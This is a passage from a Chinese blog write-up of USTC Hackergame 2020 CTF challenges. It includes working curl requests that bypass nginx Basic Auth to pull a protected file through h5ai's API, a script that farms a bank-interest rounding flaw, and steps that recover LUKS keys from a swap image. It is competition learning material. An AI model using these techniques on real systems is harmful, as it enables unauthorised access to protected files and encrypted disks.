<code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 